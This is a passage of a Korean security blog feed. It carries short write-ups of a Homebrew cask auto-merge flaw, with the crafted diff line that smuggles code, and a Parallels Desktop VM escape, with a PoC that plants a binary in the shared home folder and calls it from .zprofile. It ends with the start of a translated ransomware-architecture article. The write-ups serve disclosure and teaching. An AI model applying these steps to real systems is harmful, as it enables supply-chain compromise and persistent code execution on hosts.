&#xC874;&#xC7AC;&#xD558;&#xBA70; &#xD574;&#xB2F9; action&#xC740; <code>git_diff</code> &#xB97C; &#xC0AC;&#xC6A9;&#xD574; pull request&#xB41C; &#xCF54;&#xB4DC;&#xC758; &#xBCC0;&#xACBD;&#xC810;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xACE0; &#xBCC0;&#xACBD;&#xC810;&#xC774; &#xD06C;&#xC9C0; &#xC54A;&#xACE0; &#xAC04;&#xB2E8;&#xD55C; &#xACBD;&#xC6B0; &#xC774;&#xB97C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; merge&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; <code>git_diff</code> &#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xD30C;&#xC77C;&#xC744; &#xD30C;&#xC2F1;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xAC01; &#xD589;&#xC5D0; &#xB300;&#xD574; <code>^diff --git(?: a/(\S+))?(?: b/(\S+))?</code> &#xC815;&#xADDC;&#xC2DD;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xD604;&#xC7AC; &#xCC98;&#xB9AC;&#xC911;&#xC778; &#xD30C;&#xC77C; &#xC815;&#xBCF4;&#xB97C; &#xC815;&#xADDC;&#xC2DD;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;.</li><li>1&#xB2E8;&#xACC4;&#xAC00; &#xC77C;&#xCE58;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0; <code>git_diff/file.rb</code>&#xC758; <code>extract_diff_meta_data</code> &#xD568;&#xC218;&#xC758; &#xC815;&#xADDC;&#xC2DD; &#xC911; &#xD558;&#xB098;&#xC640; &#xC77C;&#xCE58;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;. </li><li>2&#xB2E8;&#xACC4;&#xAC00; &#xC77C;&#xCE58;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0; &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC5D0; &#xB300;&#xD55C; &#xBCC0;&#xACBD;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD574; <code>+</code>, <code>-</code>&#xC5D0; &#xB530;&#xB77C; &#xCF54;&#xB4DC; &#xCD94;&#xAC00; &#xB610;&#xB294; &#xC0AD;&#xC81C;&#xB85C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xB9CC;&#xC57D; &#xBCC0;&#xACBD;&#xB41C; &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC774; <code>++ &quot;?b/(.*)</code> &#xD615;&#xC2DD;&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xBA74; <code>extract_diff_meta_data</code> &#xD568;&#xC218;&#xC758; &#xC815;&#xADDC;&#xC2DD; &#xC911; &#xC544;&#xB798; &#xC815;&#xADDC;&#xC2DD;&#xC5D0; &#xB9E4;&#xCE6D;&#xB418;&#xC5B4; &#xD30C;&#xC77C; &#xB0B4;&#xC6A9;&#xC5D0; &#xB300;&#xD55C; &#xBCC0;&#xACBD;&#xC774; &#xC544;&#xB2CC; &#xD30C;&#xC77C; &#xACBD;&#xB85C; &#xC815;&#xBCF4;&#xB85C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xD30C;&#xC77C; &#xB0B4;&#xC6A9; &#xBCC0;&#xACBD;&#xC810;&#xC774; &#xC5C6;&#xB294; pull request&#xB85C; &#xC790;&#xB3D9;&#xC73C;&#xB85C; merge&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ruby"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">extract_diff_meta_data</span><span class="hljs-params">(string)</span></span>...<span class="hljs-keyword">elsif</span> b_path_info = <span class="hljs-regexp">%r{^[+]{3}</span> <span class="hljs-string">&quot;?b/(.*)$}.match(string)</span><span class="hljs-string">@b_path = b_path_info[1]</span><span class="hljs-string">...</span></code></pre><p>&#xC704; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC545;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p>Homebrew/Casks&#xC5D0; &#xD3EC;&#xD568;&#xB41C; &#xB8E8;&#xBE44;&#xD30C;&#xC77C;&#xC5D0; &#xC784;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD55C; &#xC544;&#xB798; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs c">++ <span class="hljs-string">&quot;b/#{arbitrary code}&quot;</span>++ b/Casks/iterm2.r</code></pre></li><li><p>pull request&#xB97C; &#xBCF4;&#xB0B4;&#xBA74; <code>git_diff</code>&#xAC00; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xC815;&#xBCF4;&#xB85C; &#xCC98;&#xB9AC;&#xD574; &#xCD94;&#xAC00;&#xB41C; &#xCF54;&#xB4DC;&#xAC00; &#xBB34;&#xC2DC;&#xB418;&#xACE0; <code>Review-cask-pr</code> action&#xC5D0;&#xC11C;&#xB294; &#xBCC0;&#xACBD;&#xC810;&#xC774; &#xC5C6;&#xB294; &#xCF54;&#xB4DC;&#xB85C; &#xC778;&#xC2DD;&#xD574; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; merge&#xB429;&#xB2C8;&#xB2E4;.</p></li><li>merge&#xB41C; &#xBC84;&#xC804;&#xC758; &#xD328;&#xD0A4;&#xC9C0;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; PC&#xC5D0;&#xC11C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC790;&#xB3D9;&#xC73C;&#xB85C; pull request&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xACE0; merge&#xD558;&#xB294; <code>automerge</code> &#xBC0F; <code>review-cask-pr</code> github action&#xC744; &#xC81C;&#xAC70;&#xD558;&#xACE0; &#xC218;&#xB3D9;&#xC73C;&#xB85C; &#xAC80;&#xC0AC; &#xBC0F; &#xC2B9;&#xC778;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>github</tag>
      
      <tag>L0ch</tag>
      
      <tag>homebrew</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Full VM escape Parallels Desktop on Intel and M1</title>
    <link href="/2021/04/26/idioth/2021-04-26/"/>
    <url>/2021/04/26/idioth/2021-04-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://zerodayengineering.com/blog/dont-share-your-home.html">Don&#x2019;t Share Your $HOME with Untrusted Guests</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>4&#xC6D4; 23&#xC77C; &#xAE30;&#xC900; Parallels Desktop &#xCD5C;&#xC2E0; &#xBC84;&#xC804;(Parallels Desktop 16.5.0 both Intel and M1)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB9E4;&#xD0A8;&#xD1A0;&#xC2DC; &#xCEF4;&#xD4E8;&#xD130;&#xC5D0; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xAC00;&#xC0C1;&#xD654;&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xB294; Parallels Desktop&#xC5D0;&#xC11C; Guest OS&#xC640; <code>$HOME</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xACF5;&#xC720;&#xD558;&#xC5EC; &#xBC1C;&#xC0DD;&#xD558;&#xB294; VM Escape&#xAC00; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Parallels&#xB294; &#xAE30;&#xBCF8; &#xAC12;&#xC73C;&#xB85C; &#xD638;&#xC2A4;&#xD2B8; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;(MacOS)&#xC758; &#xC0AC;&#xC6A9;&#xC790; &#xD648; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; Parallels &#xACF5;&#xC720; &#xD3F4;&#xB354;&#xB85C; &#xAC8C;&#xC2A4;&#xD2B8; OS&#xC5D0; &#xACF5;&#xC720;&#xD569;&#xB2C8;&#xB2E4;. MacOS&#xC5D0;&#xC11C; interactive shell binary&#xB294; &#xB2E4;&#xB978; &#xC720;&#xB2C9;&#xC2A4; &#xAE30;&#xBC18; OS&#xC640; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xD130;&#xBBF8;&#xB110;&#xC774; &#xC5F4;&#xB9B4; &#xB54C;&#xB9C8;&#xB2E4; &#xC2E4;&#xD589;&#xB418;&#xBA70; bash profile&#xC744; &#xCC38;&#xC870;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xC5EC; &#xACF5;&#xC720; &#xD648; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC545;&#xC131; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC0BD;&#xC785;&#xD55C; &#xD6C4; <code>.zprofile</code>&#xC774;&#xB098; &#xB2E4;&#xB978; shell profile file&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; &#xD130;&#xBBF8;&#xB110;&#xC774; &#xC2DC;&#xC791;&#xB420; &#xB54C;&#xB9C8;&#xB2E4; &#xD638;&#xC2A4;&#xD2B8; OS&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC9C0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xC2A4;&#xD2B8; OS&#xC5D0; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>POC&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC73C;&#xBA70; &#xC545;&#xC131; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC0D8;&#xD50C;&#xC740; <a href="https://github.com/badd1e/Proof-of-Concept/tree/main/prl_not0day">github</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk">cp mybinary <span class="hljs-regexp">/media/</span>psf<span class="hljs-regexp">/Home/</span>.hellochmod +x <span class="hljs-regexp">/media/</span>psf<span class="hljs-regexp">/Home/</span>.helloecho <span class="hljs-string">&quot;~/.hello&quot;</span> &gt;&gt; <span class="hljs-regexp">/media/</span>psf<span class="hljs-regexp">/Home/</span>.zprofile</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mac</tag>
      
      <tag>parallels</tag>
      
      <tag>idioth</tag>
      
      <tag>vm escape</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Architecture of Ransomware Part 2</title>
    <link href="/2021/04/25/idioth/arch_of_ransomware_part2/"/>
    <url>/2021/04/25/idioth/arch_of_ransomware_part2/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! idioth&#xC785;&#xB2C8;&#xB2E4;. &#xAE38;&#xACE0; &#xAE38;&#xC5C8;&#xB358; &#xC911;&#xAC04;&#xACE0;&#xC0AC; &#xAE30;&#xAC04;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC81C; &#xC911;&#xAC04;&#xACE0;&#xC0AC; &#xAE30;&#xAC04;&#xC740; &#xB354; &#xAE38;&#xC5B4;&#xC11C; &#xC544;&#xC9C1; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC558;&#xB124;&#xC694;. &#xC2DC;&#xD5D8; &#xD558;&#xB098;&#xC640; &#xB300;&#xCCB4; &#xACFC;&#xC81C; 3&#xAC1C;&#xAC00; &#xB0A8;&#xC544;&#xC788;&#xB294; &#xC0B6;&#xC785;&#xB2C8;&#xB2E4;. &#xAC8C;&#xB2E4;&#xAC00; &#xACFC;&#xBAA9; &#xD558;&#xB098;&#xB294; &#xC591;&#xC774; &#xB108;&#xBB34; &#xB9CE;&#xC544;&#xC11C; &#xC120;&#xD0DD;&#xACFC; &#xC9D1;&#xC911;&#xC744; &#xD588;&#xB294;&#xB370; &#xC81C;&#xAC00; &#xC120;&#xD0DD;&#xD55C; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; 12 &#xBB38;&#xC81C; &#xC911; &#xD55C; &#xBB38;&#xC81C; &#xB098;&#xC654;&#xB124;&#xC694;. 10&#xC810; &#xBC11;&#xC73C;&#xB85C; &#xBC1B;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xD558;&#xD558;&#xD558;&#xD558;&#xD558;&#xD558;&#xD558;&#xD558;&#xD558;</p><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled.png" alt></p><p>&#xC774;&#xBBF8; &#xC9C0;&#xB098;&#xAC04; &#xC77C; &#xD6C4;&#xD68C;&#xD558;&#xC9C0; &#xC54A;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026; &#xAE30;&#xB9D0; &#xB54C; &#xB354; &#xC798;&#xD558;&#xBA74; &#xB418;&#xB2C8;&#xAE4C;&#xC694;^^. &#xC7A1;&#xB2F4;&#xC774; &#xAE38;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; &#xC800;&#xBC88; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0; &#xC774;&#xC5B4;&#xC11C; &#xD30C;&#xD2B8; 2&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xC774;&#xC804; &#xAC8C;&#xC2DC;&#xAE00; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;: <a href="https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/">[Translation] Architecture of Ransomware Part 1</a></p><hr><blockquote><p>&#xC6D0;&#xBB38; &#xAE00; : <a href="https://infosecwriteups.com/architecture-of-a-ransomware-2-2-e22d8eb11cee">Architecture of a ransomware (2/2)</a></p></blockquote><p><a href="https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/">Part 1</a>&#xC5D0;&#xC11C; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xD6A8;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xB370; &#xD544;&#xC694;&#xD55C; &#xC8FC;&#xC694;&#xD55C; &#xAC1C;&#xB150;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC124;&#xBA85;&#xD588;&#xB2E4;. &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xD30C;&#xC774;&#xC36C; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xAC1C;&#xB150;&#xB4E4;&#xC744; &#xBCF4;&#xC5EC;&#xC904; &#xAC83;&#xC774;&#xB2E4;. &#xB610;&#xD55C; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC704;&#xD55C; pycryptodome &#xD30C;&#xC774;&#xC36C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC758; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC0AC;&#xC6A9;&#xBC95;&#xB3C4; &#xB2E4;&#xB8F0; &#xAC83;&#xC774;&#xB2E4;. &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xD0A4;&#xB514;&#xB4E4;&#xC774; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xC804;&#xCCB4; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xB97C; &#xC62C;&#xB9AC;&#xC9C4; &#xC54A;&#xC744; &#xAC83;&#xC774;&#xB2E4;. &#xC774; &#xAC8C;&#xC2DC;&#xAE00;&#xC758; &#xBAA9;&#xC801;&#xC740; &#xC545;&#xC131; &#xD589;&#xC704;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xB77C;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xC5D0; &#xB300;&#xD55C; &#xC9C0;&#xC2DD;&#xC744; &#xACF5;&#xC720;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><h1 id="&#xC77C;&#xBC18;&#xC801;&#xC778;-&#xACE0;&#xB824;-&#xC0AC;&#xD56D;"><a href="#&#xC77C;&#xBC18;&#xC801;&#xC778;-&#xACE0;&#xB824;-&#xC0AC;&#xD56D;" class="headerlink" title="&#xC77C;&#xBC18;&#xC801;&#xC778; &#xACE0;&#xB824; &#xC0AC;&#xD56D;"></a>&#xC77C;&#xBC18;&#xC801;&#xC778; &#xACE0;&#xB824; &#xC0AC;&#xD56D;</h1><p>&#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBA70; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4; &#xAC1C;&#xBC1C;&#xC5D0; &#xAD00;&#xD574;&#xC11C; &#xCC3E;&#xC544;&#xBCF4;&#xB2E4;&#xAC00; <a href="https://medium.com/u/ea2f2c25847b?source=post_page-----e22d8eb11cee--------------------------------">Tarc&#xED;sio Marinho</a>&#xAC00; &#xAC1C;&#xBC1C;&#xD55C; <a href="https://github.com/tarcisio-marinho/GonnaCry">GonnaCry</a>&#xB77C;&#xB294; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB97C; &#xBC1C;&#xACAC;&#xD588;&#xB2E4;. &#xCF54;&#xB4DC;&#xAC00; &#xB9E4;&#xC6B0; &#xBD84;&#xBA85;&#xD558;&#xBA70; &#xC77D;&#xC5B4; &#xBCF4;&#xB294; &#xAC83;&#xC744; &#xCD94;&#xCC9C;&#xD55C;&#xB2E4;.</p><p>&#xADF8;&#xC758; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB294; &#x201C;management side&#x201D;&#xB97C; &#xC704;&#xD55C; &#xBAA8;&#xB4E0; &#xCF54;&#xB4DC;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB2E4;. &#xADF8;&#xB294; &#xBCF5;&#xD638;&#xD654; &#xD0A4;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xACE0; &#xAC10;&#xC5FC;&#xB41C; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xD1B5;&#xC2E0;&#xD558;&#xB294; &#xD574;&#xCEE4; &#xCE21; &#xC11C;&#xBC84;&#xB97C; &#xCF54;&#xB529;&#xD588;&#xB2E4;.</p><p>&#xD544;&#xC790;&#xB294; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xBC30;&#xC6B0;&#xAE30; &#xC704;&#xD574; &#xBAA8;&#xB4E0; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xC600;&#xACE0;, &#xC2E4;&#xC81C; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xB294; &#xC774; &#xBD80;&#xBD84;&#xC744; &#xBAA8;&#xB450; &#xB2E4;&#xB974;&#xAC8C; &#xCC98;&#xB9AC;&#xD558;&#xBBC0;&#xB85C; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC740; &#xB2E4;&#xB8E8;&#xACE0; &#xC2F6;&#xC9C0; &#xC54A;&#xC558;&#xB2E4;. payment&#xB97C; &#xB4F1;&#xB85D;&#xD558;&#xACE0; &#xBCF5;&#xD638;&#xD654; &#xD0A4;&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xB294; &#xC790;&#xB3D9;&#xD654; &#xC11C;&#xBE44;&#xC2A4;, victim&#xACFC; &#xC9C1;&#xC811; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD558;&#xB294; &#xD1A0;&#xB974; &#xC774;&#xBA54;&#xC77C; &#xC8FC;&#xC18C;, &#xBA87; &#xAC1C;&#xC758; &#xC0D8;&#xD50C; &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xB4F1;&#xC774; &#xC788;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC740; &#xCEA0;&#xD398;&#xC778;&#xB9C8;&#xB2E4; &#xB2EC;&#xB77C;&#xC11C; &#xB2E4;&#xB8E8;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC774;&#xB2E4;. &#xB098;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; &#xAC10;&#xC5FC; &#xCE21;&#xBA74;&#xC5D0; &#xC8FC;&#xB85C; &#xD3EC;&#xCEE4;&#xC2A4;&#xB97C; &#xB9DE;&#xCD9C; &#xAC83;&#xC774;&#xB2E4;.</p><h1 id="&#xC5B8;&#xC5B4;-&#xC120;&#xD0DD;"><a href="#&#xC5B8;&#xC5B4;-&#xC120;&#xD0DD;" class="headerlink" title="&#xC5B8;&#xC5B4; &#xC120;&#xD0DD;"></a>&#xC5B8;&#xC5B4; &#xC120;&#xD0DD;</h1><p>&#xD544;&#xC790;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xC774;&#xC720;&#xB85C; &#xD30C;&#xC774;&#xC36C;&#xC744; &#xC120;&#xD0DD;&#xD588;&#xB2E4;. &#xC8FC;&#xC694;&#xD55C; &#xC774;&#xC720;&#xB294; &#x3139;&#x3147; &#xC77D;&#xAE30; &#xC27D;&#xACE0; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC26C;&#xC6B0;&#xB2C8;&#xAE4C;.</p><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%201.png" alt></p><p><code>os.system</code>&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB41C; OS&#xBCC4; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; &#xD06C;&#xB85C;&#xC2A4; &#xD50C;&#xB7AB;&#xD3FC; &#xB610;&#xD55C; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;. &#xB610;&#xD55C; &#xC18D;&#xB3C4;&#xAC00; &#xBE60;&#xB974;&#xACE0; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC704;&#xD55C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xAC00; &#xC788;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC; &#xB09C;&#xB3C5;&#xD654;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xC5EC; &#xB9AC;&#xBC84;&#xC2F1;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xAC8C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xD30C;&#xC774;&#xC36C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC120;&#xD0DD;&#xD560; &#xB54C; &#xB3D9;&#xC77C;&#xD55C; &#xAE30;&#xB2A5;&#xC744; &#xD558;&#xB294; &#xAC78; &#xC5EC;&#xB7EC; &#xAC1C; &#xCC3E;&#xC544;&#xB77C;. &#xAC01;&#xAC01;&#xC758; &#xAC83;&#xC744; &#xC5F0;&#xAD6C;&#xD558;&#xACE0; &#xAC00;&#xC7A5; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xAC83;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC554;&#xD638;&#xD654;&#xCC98;&#xB7FC; &#xBE60;&#xB974;&#xAC8C; &#xBCC0;&#xD654;&#xD558;&#xB294; &#xAC83;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC88B;&#xC740; &#xC811;&#xADFC; &#xBC29;&#xC2DD;&#xC774;&#xB2E4;. &#xC624;&#xB798;&#xB41C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAC70;&#xB098; <a href="https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/">Lockcrypt</a>&#xCC98;&#xB7FC; &#xC790;&#xCCB4; &#xAC1C;&#xBC1C;&#xD55C; &#xC554;&#xD638;&#xD654;&#xB97C; &#xC0AC;&#xC6A9;(&#xD558;&#xC9C0; &#xB9C8;)&#xD558;&#xBA74; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xBCF5;&#xD638;&#xD654;&#xB420; &#xC218;&#xB3C4; &#xC788;&#xB2E4;.  &#xC6B0;&#xB9AC;&#xB294; &#xC798; &#xC54C;&#xB824;&#xC9C4; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; <a href="https://pypi.org/project/pycryptodome/">pycryptodome</a>&#xACFC; <a href="https://docs.python.org/3/library/secrets.html">secrets</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xAC83;&#xC774;&#xB2E4;.</p><blockquote><p>Note: &#xC2E4;&#xC81C;&#xB85C; &#xBE44;&#xB300;&#xCE6D;+&#xB300;&#xCE6D; &#xC554;&#xD638;&#xD654;&#xB97C; &#xACB0;&#xD569;&#xD55C; wrapper&#xAC00; &#xC788;&#xC9C0;&#xB9CC; &#xAC1C;&#xB150;&#xC744; &#xC124;&#xBA85;&#xD558;&#xAE30; &#xC704;&#xD574; pycryptodome&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xAC01; &#xAE30;&#xB2A5;&#xC744; &#xAD6C;&#xD604;&#xD560; &#xAC83;&#xC774;&#xB2E4;.</p></blockquote><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%202.png" alt></p><h1 id="&#xD544;&#xC694;&#xD55C;-&#xAE30;&#xB2A5;-&#xC694;&#xC57D;"><a href="#&#xD544;&#xC694;&#xD55C;-&#xAE30;&#xB2A5;-&#xC694;&#xC57D;" class="headerlink" title="&#xD544;&#xC694;&#xD55C; &#xAE30;&#xB2A5; &#xC694;&#xC57D;"></a>&#xD544;&#xC694;&#xD55C; &#xAE30;&#xB2A5; &#xC694;&#xC57D;</h1><ul><li><code>generate32ByteKey()</code>: &#xB79C;&#xB364;&#xD55C; 32&#xBC14;&#xC774;&#xD2B8; &#xD0A4;&#xB97C; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;. &#xC774;&#xB97C; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xB2E4;. <code>/dev/urandom</code>&#xC5D0;&#xC11C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xAE01;&#xC5B4;&#xC640;&#xC11C; <code>sha256sum</code>&#xC744; &#xD558;&#xBA74; &#xB418;&#xC9C0;&#xB9CC; &#xB9AC;&#xB205;&#xC2A4;&#xC5D0; &#xD55C;&#xC815;&#xC801;&#xC774;&#xBA70; &#xD06C;&#xB85C;&#xC2A4; &#xD50C;&#xB7AB;&#xD3FC;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xACE0; &#xC2F6;&#xC73C;&#xBBC0;&#xB85C; secrets &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xAC83;&#xC774;&#xB2E4;. <code>secrets.token_hex(32)</code>&#xB97C; 